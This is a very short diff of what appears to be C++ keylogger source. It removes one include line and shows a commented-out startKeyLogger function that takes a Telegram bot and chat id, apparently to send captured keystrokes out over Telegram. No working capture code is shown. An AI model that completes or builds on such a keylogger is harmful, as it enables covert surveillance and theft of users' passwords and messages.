@@ -1,5 +1,4 @@
 #include "keyLogger.h"
-#include "globals.h"
 
 // Not efficient keyLogger
 /*void startKeyLogger(const TgBot::Bot& bot_ref, const int64_t chat_id) {
